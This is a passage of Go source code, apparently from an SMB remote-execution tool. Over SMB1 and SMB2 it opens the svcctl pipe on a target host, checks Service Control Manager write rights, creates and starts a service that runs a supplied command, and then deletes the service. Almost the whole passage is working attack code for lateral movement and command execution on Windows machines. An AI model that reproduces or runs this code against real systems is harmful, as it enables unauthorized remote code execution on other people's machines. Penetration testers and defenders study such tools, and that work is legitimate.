					clientSend := append(NetBIOSSessionService, smbHeader...)
					clientSend = append(clientSend, smbData...)
					clientSend = append(clientSend, rpcData...)
					clientSend = append(clientSend, scmData...)
					clientStream.Write(clientSend)
					clientStream.Flush()
					conn.Read(clientRecieve)
					stage = "ReadAndXRequest"
					stageNext = "CheckAccess"

				case "ReadAndXRequest":
					time.Sleep(time.Duration(150) * time.Millisecond)
					packetSMBHeader := smb.NewPacketSMBHeaderUnflat([]byte{0x2e}, []byte{0x18}, []byte{0x05, 0x28}, SMBTreeID, processIDBytes, SMBUserID)

					if smbSigning {
						smb.SetSmbSignitureAndFlags(packetSMBHeader, &SMBSigningCounter)
					}

					smbHeader := helpers.FlattenOrderedMap(*packetSMBHeader)
					smbData := smb.NewPacketSMBReadAndXRequest(SMBFID)
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(smbHeader), len(smbData))

					if smbSigning {
						smbHeader = smb.ComputeSigniture(packetSMBHeader, sessionKey, smbHeader, smbData)
					}

					clientSend := append(NetBIOSSessionService, smbHeader...)
					clientSend = append(clientSend, smbData...)
					clientStream.Write(clientSend)
					clientStream.Flush()
					conn.Read(clientRecieve)
					stage = stageNext

				case "RPCBind":
					SMBFIDSlice := clientRecieve[42:44]
					SMBFID = make([]byte, len(SMBFIDSlice))
					copy(SMBFID, SMBFIDSlice)

					packetSMBHeader := smb.NewPacketSMBHeaderUnflat([]byte{0x2f}, []byte{0x18}, []byte{0x05, 0x28}, SMBTreeID, processIDBytes, SMBUserID)
					if smbSigning {
						smb.SetSmbSignitureAndFlags(packetSMBHeader, &SMBSigningCounter)
					}

					smbHeader := helpers.FlattenOrderedMap(*packetSMBHeader)
					rpcData := pkg.NewPacketRPCBind([]byte{0x48, 0x00}, 1, []byte{0x01}, []byte{0x00, 0x00}, namedPipeUUID, []byte{0x02, 0x00})
					smbData := smb.NewPacketSMBWriteAndXRequest(SMBFID, len(rpcData))
					rpcDataLength := len(smbData) + len(rpcData)
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(smbHeader), rpcDataLength)

					if smbSigning {
						smbHeader = smb.ComputeSigniture(packetSMBHeader, sessionKey, smbHeader, smbData, rpcData)
					}

					clientSend := append(NetBIOSSessionService, smbHeader...)
					clientSend = append(clientSend, smbData...)
					clientSend = append(clientSend, rpcData...)
					clientStream.Write(clientSend)
					clientStream.Flush()
					conn.Read(clientRecieve)
					stage = "ReadAndXRequest"
					stageNext = "OpenSCManagerW"
				case "StartServiceW":
					if bytes.Equal(clientRecieve[112:116], []byte{0x00, 0x00, 0x00, 0x00}) {
						logger.Printf("[+] Service created on %s\n", *config.Target)
						smbServiceManagerContextHandleSlice := clientRecieve[92:112]
						smbServiceManagerContextHandle = make([]byte, len(smbServiceManagerContextHandleSlice))
						copy(smbServiceManagerContextHandle, smbServiceManagerContextHandleSlice)

						packetSMBHeader := smb.NewPacketSMBHeaderUnflat([]byte{0x2f}, []byte{0x18}, []byte{0x05, 0x28}, SMBTreeID, processIDBytes, SMBUserID)

						if smbSigning {
							smb.SetSmbSignitureAndFlags(packetSMBHeader, &SMBSigningCounter)
						}

						scmData = pkg.NewPacketSCMStartServiceW(smbServiceManagerContextHandle)
						rpcData := pkg.NewPacketRPCRequest([]byte{0x03}, len(scmData), 0, 0, []byte{0x03, 0x00, 0x00, 0x00}, []byte{0x00, 0x00}, []byte{0x13, 0x00}, []byte{})
						smbHeader := helpers.FlattenOrderedMap(*packetSMBHeader)
						smbData := smb.NewPacketSMBWriteAndXRequest(SMBFID, len(rpcData)+len(scmData))
						rpcDataLength := len(smbData) + len(scmData) + len(rpcData)
						NetBIOSsessionService := pkg.NewPacketNetBIOSSessionService(len(smbHeader), rpcDataLength)

						if smbSigning {
							smbHeader = smb.ComputeSigniture(packetSMBHeader, sessionKey, smbHeader, smbData, rpcData, scmData)
						}

						clientSend := append(NetBIOSsessionService, smbHeader...)
						clientSend = append(clientSend, smbData...)
						clientSend = append(clientSend, rpcData...)
						clientSend = append(clientSend, scmData...)
						logger.Printf("[*] Trying to execute command on %s\n", *config.Target)
						clientStream.Write(clientSend)
						clientStream.Flush()
						conn.Read(clientRecieve)

						stage = "ReadAndXRequest"
						stageNext = "DeleteServiceW"
					} else if bytes.Equal(clientRecieve[112:116], []byte{0x31, 0x04, 0x00, 0x00}) {
						logger.Println("[-] Service creation failed on " + *config.Target)
						stage = "Exit"
					} else {
						logger.Println("[-] Service creation fault context mismatch")
						stage = "Exit"
					}
				case "TreeConnectAndXRequest":
					packetSMBHeader := smb.NewPacketSMBHeaderUnflat([]byte{0x75}, []byte{0x18}, []byte{0x01, 0x48}, []byte{0xff, 0xff}, processIDBytes, SMBUserID)

					if smbSigning {
						smb.SetSmbSignitureAndFlags(packetSMBHeader, &SMBSigningCounter)
					}

					smbHeader := helpers.FlattenOrderedMap(*packetSMBHeader)
					smbData := smb.NewPacketSMBTreeConnectAndXRequest(SMBPathBytes)
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(smbHeader), len(smbData))

					if smbSigning {
						smbHeader = smb.ComputeSigniture(packetSMBHeader, sessionKey, smbHeader, smbData)
					}

					clientSend := append(NetBIOSSessionService, smbHeader...)
					clientSend = append(clientSend, smbData...)
					clientStream.Write(clientSend)
					clientStream.Flush()
					conn.Read(clientRecieve)
					stage = "CreateAndXRequest"
				case "TreeDisconnect":
					packetSMBHeader := smb.NewPacketSMBHeaderUnflat([]byte{0x71}, []byte{0x18}, []byte{0x07, 0xc8}, SMBTreeID, processIDBytes, SMBUserID)

					if smbSigning {
						smb.SetSmbSignitureAndFlags(packetSMBHeader, &SMBSigningCounter)
					}

					smbHeader := helpers.FlattenOrderedMap(*packetSMBHeader)
					smbData := smb.NewPacketSMBTreeDisconnectRequest()
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(smbHeader), len(smbData))

					if smbSigning {
						smbHeader = smb.ComputeSigniture(packetSMBHeader, sessionKey, smbHeader, smbData)
					}

					clientSend := append(NetBIOSSessionService, smbHeader...)
					clientSend = append(clientSend, smbData...)
					clientStream.Write(clientSend)
					clientStream.Flush()
					conn.Read(clientRecieve)
					stage = "Logoff"

				}
			}
		} else {
			stage = "TreeConnect"
			var stageCurrent string
			var fileID []byte
			var clientSend []byte
			var smbServiceContextHandle []byte
			_ = stageCurrent
			_ = fileID
			for stage != "Exit" {
				switch stage {
				case "CheckAccess":
					if bytes.Equal(clientRecieve[128:132], []byte{0x00, 0x00, 0x00, 0x00}) && !bytes.Equal(clientRecieve[108:128], []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}) {
						smbServiceManagerContextHandleSlice := clientRecieve[108:128]
						smbServiceManagerContextHandle = make([]byte, len(smbServiceManagerContextHandleSlice))
						copy(smbServiceManagerContextHandle, smbServiceManagerContextHandleSlice)
						if *config.Command != "" {
							logger.Printf("%s has Service Control Manager write privilege on %s\n", *config.Username, *config.Target)
							scmData = pkg.NewPacketSCMCreateServiceW(smbServiceManagerContextHandle, SMBServiceBytes, smbServiceLength, commandBytes, commandLengthBytes)

							if len(scmData) < smbSplitIndex {
								stage = "CreateServiceW"
							} else {
								// TODO add support for longer commands
								logger.Println("[-] Command is too long, please use a shorter command and try again")
								stage = "Exit"
							}

						} else {
							logger.Printf("%s has Service Control Manager write privilege on %s\n", *config.Username, *config.Target)
							smbCloseServiceHandleStage = 2
							stage = "CloseServiceHandle"
						}
					} else if bytes.Equal(clientRecieve[108:112], []byte{0x05, 0x00, 0x00, 0x00}) {
						logger.Printf("[-] %s does not have Service Control Manager write privilege on %s\n", *config.Username, *config.Target)
						stage = "Exit"
					} else {
						logger.Printf("[-] Soming went wrong with %s", *config.Target)
						stage = "Exit"
					}
				case "CloseRequest":
					stageCurrent = stage
					messageID++
					packetSMB2Header := smb.NewPacketSMB2HeaderUnflat([]byte{0x06, 0x00}, []byte{0x01, 0x00}, smbSigning, messageID, processIDByteArray, treeID, sessionID)

					if smbSigning {
						packetSMB2Header.Set("Flags", []byte{0x08, 0x00, 0x00, 0x00})
					}

					smb2Data := smb.NewPacketSMB2CloseRequest(fileID)
					smb2Header := helpers.FlattenOrderedMap(*packetSMB2Header)
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(smb2Header), len(smb2Data))

					if smbSigning {
						smb2Header = smb.ComputeSigniture2(packetSMB2Header, sessionKey, smb2Header, smb2Data)
					}

					clientSend = append(NetBIOSSessionService, smb2Header...)
					clientSend = append(clientSend, smb2Data...)
					stage = "SendReceive"

				case "CloseServiceHandle":
					scmData := []byte{}
					if smbCloseServiceHandleStage == 1 {
						logger.Println("Service deleted on " + *config.Target)
						scmData = pkg.NewPacketSCMCloseServiceHandle(smbServiceContextHandle)
					} else {
						scmData = pkg.NewPacketSCMCloseServiceHandle(smbServiceManagerContextHandle)
					}

					smbCloseServiceHandleStage++
					stageCurrent = stage
					messageID++
					packetSMB2Header := smb.NewPacketSMB2HeaderUnflat([]byte{0x09, 0x00}, []byte{0x01, 0x00}, smbSigning, messageID, processIDByteArray, treeID, sessionID)

					if smbSigning {
						packetSMB2Header.Set("Flags", []byte{0x08, 0x00, 0x00, 0x00})
					}

					rpcData := pkg.NewPacketRPCRequest([]byte{0x03}, len(scmData), 0, 0, []byte{0x01, 0x00, 0x00, 0x00}, []byte{0x00, 0x00}, []byte{0x00, 0x00}, []byte{})
					smb2Data := smb.NewPacketSMB2WriteRequest(fileID, len(rpcData)+len(scmData))
					smb2Header := helpers.FlattenOrderedMap(*packetSMB2Header)
					rpcDataLength := len(smb2Data) + len(scmData) + len(rpcData)
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(smb2Header), rpcDataLength)

					if smbSigning {
						smb2Header = smb.ComputeSigniture2(packetSMB2Header, sessionKey, smb2Header, smb2Data, rpcData, scmData)
					}

					clientSend = append(NetBIOSSessionService, smb2Header...)
					clientSend = append(clientSend, smb2Data...)
					clientSend = append(clientSend, rpcData...)
					clientSend = append(clientSend, scmData...)
					stage = "SendReceive"

				case "CreateRequest":
					stageCurrent = stage
					SMBNamedPipeBytes := []byte{0x73, 0x00, 0x76, 0x00, 0x63, 0x00, 0x63, 0x00, 0x74, 0x00, 0x6c, 0x00} // \svcctl
					messageID++
					packetSMB2Header := smb.NewPacketSMB2HeaderUnflat([]byte{0x05, 0x00}, []byte{0x01, 0x00}, smbSigning, messageID, processIDByteArray, treeID, sessionID)

					if smbSigning {
						packetSMB2Header.Set("Flags", []byte{0x08, 0x00, 0x00, 0x00})
					}

					packetsmb2Data := smb.NewPacketSMB2CreateRequestFileUnflat(SMBNamedPipeBytes)
					packetsmb2Data.Set("Share_Access", []byte{0x07, 0x00, 0x00, 0x00})
					smb2Header := helpers.FlattenOrderedMap(*packetSMB2Header)
					smb2Data := helpers.FlattenOrderedMap(*packetsmb2Data)
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(smb2Header), len(smb2Data))

					if smbSigning {
						smb2Header = smb.ComputeSigniture2(packetSMB2Header, sessionKey, smb2Header, smb2Data)
					}

					clientSend := append(NetBIOSSessionService, smb2Header...)
					clientSend = append(clientSend, smb2Data...)

					clientStream.Write(clientSend)
					clientStream.Flush()
					conn.Read(clientRecieve)

					if pkg.GetStatusPending(clientRecieve[12:16]) {
						stage = "StatusPending"
					} else {
						stage = "StatusReceived"
					}
				case "CreateServiceW":
					stageCurrent = stage
					messageID++
					packetSMB2Header := smb.NewPacketSMB2HeaderUnflat([]byte{0x09, 0x00}, []byte{0x01, 0x00}, smbSigning, messageID, processIDByteArray, treeID, sessionID)

					if smbSigning {
						packetSMB2Header.Set("Flags", []byte{0x08, 0x00, 0x00, 0x00})
					}

					rpcData := pkg.NewPacketRPCRequest([]byte{0x03}, len(scmData), 0, 0, []byte{0x01, 0x00, 0x00, 0x00}, []byte{0x00, 0x00}, []byte{0x0c, 0x00}, []byte{})
					smb2Data := smb.NewPacketSMB2WriteRequest(fileID, len(rpcData)+len(scmData))
					smb2Header := helpers.FlattenOrderedMap(*packetSMB2Header)
					rpcDataLength := len(smb2Data) + len(scmData) + len(rpcData)
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(smb2Header), rpcDataLength)

					if smbSigning {
						smb2Header = smb.ComputeSigniture2(packetSMB2Header, sessionKey, smb2Header, smb2Data, rpcData, scmData)
					}

					clientSend = append(NetBIOSSessionService, smb2Header...)
					clientSend = append(clientSend, smb2Data...)
					clientSend = append(clientSend, rpcData...)
					clientSend = append(clientSend, scmData...)
					stage = "SendReceive"

				case "DeleteServiceW":
					if bytes.Equal(clientRecieve[108:112], []byte{0x1d, 0x04, 0x00, 0x00}) {
						logger.Println("[+] Command executed with service on " + *config.Target)
					} else if bytes.Equal(clientRecieve[108:112], []byte{0x02, 0x00, 0x00, 0x00}) {
						logger.Println("[-] Service failed to start on" + *config.Target)
					}

					stageCurrent = stage
					messageID++
					packetSMB2Header := smb.NewPacketSMB2HeaderUnflat([]byte{0x09, 0x00}, []byte{0x01, 0x00}, smbSigning, messageID, processIDByteArray, treeID, sessionID)

					if smbSigning {
						packetSMB2Header.Set("Flags", []byte{0x08, 0x00, 0x00, 0x00})
					}

					scmData := pkg.NewPacketSCMDeleteServiceW(smbServiceContextHandle)
					rpcData := pkg.NewPacketRPCRequest([]byte{0x03}, len(scmData), 0, 0, []byte{0x01, 0x00, 0x00, 0x00}, []byte{0x00, 0x00}, []byte{0x02, 0x00}, []byte{})
					smb2Data := smb.NewPacketSMB2WriteRequest(fileID, len(rpcData)+len(scmData))
					smb2Header := helpers.FlattenOrderedMap(*packetSMB2Header)
					rpcDataLength := len(smb2Data) + len(scmData) + len(rpcData)
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(smb2Header), rpcDataLength)

					if smbSigning {
						smb2Header = smb.ComputeSigniture2(packetSMB2Header, sessionKey, smb2Header, smb2Data, rpcData, scmData)
					}

					clientSend = append(NetBIOSSessionService, smb2Header...)
					clientSend = append(clientSend, smb2Data...)
					clientSend = append(clientSend, rpcData...)
					clientSend = append(clientSend, scmData...)
					stage = "SendReceive"
				case "Logoff":
					stageCurrent = stage
					messageID++
					packetSMB2Header := smb.NewPacketSMB2HeaderUnflat([]byte{0x02, 0x00}, []byte{0x01, 0x00}, smbSigning, messageID, processIDByteArray, treeID, sessionID)

					if smbSigning {
						packetSMB2Header.Set("Flags", []byte{0x08, 0x00, 0x00, 0x00})
					}

					smb2Data := smb.NewPacketSMB2SessionLogoffRequest()
					smb2Header := helpers.FlattenOrderedMap(*packetSMB2Header)
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(smb2Header), len(smb2Data))

					if smbSigning {
						smb2Header = smb.ComputeSigniture2(packetSMB2Header, sessionKey, smb2Header, smb2Data)
					}

					clientSend = append(NetBIOSSessionService, smb2Header...)
					clientSend = append(clientSend, smb2Data...)
					stage = "SendReceive"

				case "StatusPending":
					conn.Read(clientRecieve)
					if !bytes.Equal(clientRecieve[12:16], []byte{0x03, 0x01, 0x00, 0x00}) {
						stage = "StatusReceived"
					}
				case "StatusReceived":
					switch stageCurrent {
					case "CloseRequest":
						stage = "TreeDisconnect"
					case "CloseServiceHandle":
						if smbCloseServiceHandleStage == 2 {
							stage = "CloseServiceHandle"
						} else {
							stage = "CloseRequest"
						}
					case "CreateRequest":
						fileIDSlice := clientRecieve[132:148]
						fileID = make([]byte, len(fileIDSlice))
						copy(fileID, fileIDSlice)
						if stage != "Exit" {
							stage = "RPCBind"
						}
					case "CreateServiceW":
						stage = "ReadRequest"
						stageNext = "StartServiceW"
					// case "CreateServiceW_First":
					// 	if SMBSplitStageFinal <= 2 {
					// 		stage = "CreateServiceW_Last"
					// 	} else {
					// 		SMBSplitStage = 2
					// 		stage = "CreateServiceW_Middle"
					// 	}
					// case "CreateServiceW_Middle":
					// 	if SMBSplitStage >= SMBSplitStageFinal {
					// 		stage = "CreateServiceW_Last"
					// 	} else {
					// 		stage = "CreateServiceW_Middle"
					// 	}
					// case "CreateServiceW_Last":
					// 	stage = "ReadRequest"
					// 	stageNext = "StartServiceW"
					case "DeleteServiceW":
						stage = "ReadRequest"
						stageNext = "CloseServiceHandle"
						smbCloseServiceHandleStage = 1
					case "Logoff":
						stage = "Exit"
					case "OpenSCManagerW":
						stage = "ReadRequest"
						stageNext = "CheckAccess"
					case "ReadRequest":
						stage = stageNext
					case "RPCBind":
						stage = "ReadRequest"
						stageNext = "OpenSCManagerW"
					case "StartServiceW":
						stage = "ReadRequest"
						stageNext = "DeleteServiceW"
					case "TreeConnect":
						treeID = clientRecieve[40:44]
						stage = "CreateRequest"
					case "TreeDisconnect":
						stage = "Logoff"
					}
				case "OpenSCManagerW":
					stageCurrent = stage
					messageID++
					packetSMB2Header := smb.NewPacketSMB2HeaderUnflat([]byte{0x09, 0x00}, []byte{0x01, 0x00}, smbSigning, messageID, processIDByteArray, treeID, sessionID)

					if smbSigning {
						packetSMB2Header.Set("Flags", []byte{0x08, 0x00, 0x00, 0x00})
					}

					scmData := pkg.NewPacketSCMOpenSCManagerW(SMBServiceBytes, smbServiceLength)
					rpcData := pkg.NewPacketRPCRequest([]byte{0x03}, len(scmData), 0, 0, []byte{0x01, 0x00, 0x00, 0x00}, []byte{0x00, 0x00}, []byte{0x0f, 0x00}, []byte{})
					smb2Data := smb.NewPacketSMB2WriteRequest(fileID, len(rpcData)+len(scmData))
					smb2Header := helpers.FlattenOrderedMap(*packetSMB2Header)
					rpcDataLength := len(smb2Data) + len(scmData) + len(rpcData)
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(smb2Header), rpcDataLength)

					if smbSigning {
						smb2Header = smb.ComputeSigniture2(packetSMB2Header, sessionKey, smb2Header, smb2Data, rpcData, scmData)
					}

					clientSend = append(NetBIOSSessionService, smb2Header...)
					clientSend = append(clientSend, smb2Data...)
					clientSend = append(clientSend, rpcData...)
					clientSend = append(clientSend, scmData...)
					stage = "SendReceive"

				case "ReadRequest":
					time.Sleep(time.Duration(150) * time.Millisecond)
					stageCurrent = stage
					messageID++
					packetSMB2Header := smb.NewPacketSMB2HeaderUnflat([]byte{0x08, 0x00}, []byte{0x01, 0x00}, smbSigning, messageID, processIDByteArray, treeID, sessionID)

					if smbSigning {
						packetSMB2Header.Set("Flags", []byte{0x08, 0x00, 0x00, 0x00})
					}

					packetsmb2Data := smb.NewPacketSMB2ReadRequestUnflat(fileID)
					packetsmb2Data.Set("Length", []byte{0xff, 0x00, 0x00, 0x00})
					smb2Header := helpers.FlattenOrderedMap(*packetSMB2Header)
					smb2Data := helpers.FlattenOrderedMap(*packetsmb2Data)
					NetBIOSsessionService := pkg.NewPacketNetBIOSSessionService(len(smb2Header), len(smb2Data))

					if smbSigning {
						smb2Header = smb.ComputeSigniture2(packetSMB2Header, sessionKey, smb2Header, smb2Data)
					}

					clientSend = append(NetBIOSsessionService, smb2Header...)
					clientSend = append(clientSend, smb2Data...)
					stage = "SendReceive"

				case "RPCBind":
					stageCurrent = stage
					// SMBNamedPipeBytes = []byte{0x73, 0x00, 0x76, 0x00, 0x63, 0x00, 0x63, 0x00, 0x74, 0x00, 0x6c, 0x00} // \svcctl
					messageID++
					packetSMB2Header := smb.NewPacketSMB2HeaderUnflat([]byte{0x09, 0x00}, []byte{0x01, 0x00}, smbSigning, messageID, processIDByteArray, treeID, sessionID)

					if smbSigning {
						packetSMB2Header.Set("Flags", []byte{0x08, 0x00, 0x00, 0x00})
					}

					rpcData := pkg.NewPacketRPCBind([]byte{0x48, 0x00}, 1, []byte{0x01}, []byte{0x00, 0x00}, namedPipeUUID, []byte{0x02, 0x00})
					smb2Data := smb.NewPacketSMB2WriteRequest(fileID, len(rpcData))
					smb2Header := helpers.FlattenOrderedMap(*packetSMB2Header)
					rpcDataLength := len(smb2Data) + len(rpcData)
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(smb2Header), rpcDataLength)

					if smbSigning {
						smb2Header = smb.ComputeSigniture2(packetSMB2Header, sessionKey, smb2Header, smb2Data, rpcData)
					}

					clientSend = append(NetBIOSSessionService, smb2Header...)
					clientSend = append(clientSend, smb2Data...)
					clientSend = append(clientSend, rpcData...)
					stage = "SendReceive"
				case "SendReceive":
					clientStream.Write(clientSend)
					clientStream.Flush()
					conn.Read(clientRecieve)

					if pkg.GetStatusPending(clientRecieve[12:16]) {
						stage = "StatusPending"
					} else {
						stage = "StatusReceived"
					}
				case "StartServiceW":
					if bytes.Equal(clientRecieve[132:136], []byte{0x00, 0x00, 0x00, 0x00}) {
						logger.Printf("Service created on %s\n", *config.Target)
						smbServiceContextHandleSlice := clientRecieve[112:132]
						smbServiceContextHandle = make([]byte, len(smbServiceContextHandleSlice))
						copy(smbServiceContextHandle, smbServiceContextHandleSlice)
						stageCurrent = stage
						messageID++
						packetSMB2Header := smb.NewPacketSMB2HeaderUnflat([]byte{0x09, 0x00}, []byte{0x01, 0x00}, smbSigning, messageID, processIDByteArray, treeID, sessionID)

						if smbSigning {
							packetSMB2Header.Set("Flags", []byte{0x08, 0x00, 0x00, 0x00})
						}

						scmData := pkg.NewPacketSCMStartServiceW(smbServiceContextHandle)
						rpcData := pkg.NewPacketRPCRequest([]byte{0x03}, len(scmData), 0, 0, []byte{0x01, 0x00, 0x00, 0x00}, []byte{0x00, 0x00}, []byte{0x13, 0x00}, []byte{})
						smb2Data := smb.NewPacketSMB2WriteRequest(fileID, len(rpcData)+len(scmData))
						smb2Header := helpers.FlattenOrderedMap(*packetSMB2Header)
						rpcDataLength := len(smb2Data) + len(scmData) + len(rpcData)
						NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(smb2Header), rpcDataLength)

						if smbSigning {
							smb2Header = smb.ComputeSigniture2(packetSMB2Header, sessionKey, smb2Header, smb2Data, rpcData, scmData)
						}

						clientSend = append(NetBIOSSessionService, smb2Header...)
						clientSend = append(clientSend, smb2Data...)
						clientSend = append(clientSend, rpcData...)
						clientSend = append(clientSend, scmData...)
						logger.Printf("[*] Trying to execute command on %s\n", *config.Target)
						stage = "SendReceive"
					} else if bytes.Equal(clientRecieve[132:136], []byte{0x31, 0x04, 0x00, 0x00}) {
						logger.Println("[-] Service creation failed on" + *config.Target)
						stage = "Exit"
					} else {
						logger.Println("[-] Service creation fault context mismatch")
						stage = "Exit"
					}

				case "TreeConnect":
					treeID = clientRecieve[40:44]
					messageID++
					stageCurrent = stage
					packetSMB2Header := smb.NewPacketSMB2HeaderUnflat([]byte{0x03, 0x00}, []byte{0x01, 0x00}, smbSigning, messageID, processIDByteArray, treeID, sessionID)

					if smbSigning {
						packetSMB2Header.Set("Flags", []byte{0x08, 0x00, 0x00, 0x00})
					}

					smb2Data := smb.NewPacketSMB2TreeConnectRequest(SMBPathBytes)
					smb2Header := helpers.FlattenOrderedMap(*packetSMB2Header)
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(smb2Header), len(smb2Data))

					if smbSigning {
						smb2Header = smb.ComputeSigniture2(packetSMB2Header, sessionKey, smb2Header, smb2Data)
					}

					clientSend := append(NetBIOSSessionService, smb2Header...)
					clientSend = append(clientSend, smb2Data...)

					clientStream.Write(clientSend)
					clientStream.Flush()
					conn.Read(clientRecieve)

					if pkg.GetStatusPending(clientRecieve[12:16]) {
						stage = "StatusPending"
					} else {
						stage = "StatusReceived"
					}

				case "TreeDisconnect":
					stageCurrent = stage
					messageID++
					packetSMB2Header := smb.NewPacketSMB2HeaderUnflat([]byte{0x04, 0x00}, []byte{0x01, 0x00}, smbSigning, messageID, processIDByteArray, treeID, sessionID)

					if smbSigning {
						packetSMB2Header.Set("Flags", []byte{0x08, 0x00, 0x00, 0x00})
					}

					smb2Data := smb.NewPacketSMB2TreeDisconnectRequest()
					smb2Header := helpers.FlattenOrderedMap(*packetSMB2Header)
					NetBIOSSessionService := pkg.NewPacketNetBIOSSessionService(len(smb2Header), len(smb2Data))

					if smbSigning {
						smb2Header = smb.ComputeSigniture2(packetSMB2Header, sessionKey, smb2Header, smb2Data)
					}

					clientSend = append(NetBIOSSessionService, smb2Header...)
					clientSend = append(clientSend, smb2Data...)
					stage = "SendReceive"

				}
			}
		}
		_ = smbCloseServiceHandleStage

	}

	// Rest of the code...

}
